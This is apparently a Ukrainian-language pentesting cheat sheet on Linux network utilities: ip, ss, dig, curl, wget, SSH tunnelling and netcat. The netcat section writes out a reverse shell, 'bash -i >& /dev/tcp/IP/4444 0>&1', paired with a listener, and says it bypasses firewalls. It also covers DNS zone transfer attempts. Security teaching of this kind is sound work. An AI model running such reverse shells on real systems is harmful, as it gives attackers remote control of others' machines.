Мережева інформація та DNS

Інтерфейси та з'єднання

  • ip addr show — всі інтерфейси
  • ip route show — таблиця маршрутизації
  • ss -tuln — відкриті порти
  • ss -tunap — з процесами (root)
  • ping -c 4 target — перевірка з'єднання
  • traceroute target — маршрут до цілі

DNS-запити

  • dig example.com A — A-запис
  • dig example.com MX — поштові сервери
  • dig @8.8.8.8 target.com — через конкретний DNS
  • dig target.com axfr — трансфер зони (якщо дозволено!)
  • nslookup example.com
  • host example.com

Увага

dig axfr — спроба трансферу DNS-зони може розкрити всю внутрішню структуру домену

curl, wget та SSH

curl — HTTP-запити

  • curl https://api.example.com — GET
  • curl -X POST -d "user=admin" url — POST
  • curl -H "Authorization: Bearer TOKEN" url
  • curl -k https://self-signed.com — ігнорувати SSL
  • curl -I url — тільки заголовки

wget — завантаження

  • wget url/file.zip — файл
  • wget -r -np -k url — дзеркало сайту
  • wget -c url — продовжити завантаження

SSH — безпечне з'єднання

  • ssh user@target — підключення
  • ssh -p 2222 user@target — інший порт
  • ssh -L 8080:localhost:80 user@target — тунель
  • ssh -D 9050 user@target — SOCKS проксі
  • ssh-keygen -t rsa -b 4096 — генерація ключа

Netcat — "швейцарський ніж" мережі

Netcat (nc) — універсальний мережевий інструмент

Читання та запис даних через мережеві з'єднання (TCP/UDP). Один з найважливіших інструментів пентестера.

Атакуючий
nc -lvnp 4444
Ціль
bash -i >& /dev/tcp/IP/4444 0>&1

Базові операції

  • nc -lvnp 4444 — слухач
  • nc target 4444 — з'єднання
  • nc -zv target 20-80 — сканування портів

Передача файлів

  • Приймач: nc -lvnp 4444 > file.txt
  • Відправник: nc target 4444 < file.txt

Reverse Shell

Підключення від цілі до атакуючого. Обходить файрволи, бо вихідні з'єднання зазвичай дозволені.

Підсумок

Головна ідея

Мережеві утиліти Linux — фундамент для розвідки, експлуатації та пост-експлуатації.

  • ip / ss — інформація про мережу та з'єднання
  • dig — DNS-розвідка та трансфер зон
  • curl — взаємодія з веб-сервісами та API
  • SSH — безпечне з'єднання та тунелювання
  • Netcat — Reverse Shell, передача файлів, сканування
  • /etc/hosts та /etc/resolv.conf — мережева конфігурація
